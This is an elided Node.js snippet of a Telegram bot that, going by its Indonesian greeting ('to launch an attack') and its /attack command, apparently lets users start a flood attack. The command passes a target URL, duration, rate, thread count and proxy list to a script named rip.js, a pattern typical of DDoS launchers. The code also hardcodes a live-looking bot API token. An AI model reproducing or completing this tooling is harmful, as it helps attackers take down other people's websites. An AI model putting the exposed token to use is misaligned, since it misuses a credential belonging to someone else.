...
const bot = new TelegramBot('7085017039:AAEQvSYFz3PXoIvmPNTX47m6OSHcpefw6OI', { polling: true });
...
bot.onText(/\/start/, (msg) => {
  ...
  const message = "Halo! Untuk melakukan serangan:\n\n"
...
bot.onText(/\/attack (.+)/, (msg, match) => {
  ...
  const browserProcess = spawn('node', ['rip.js', url, timeArg, rate, thread, proxyFile], { cwd: __dirname });
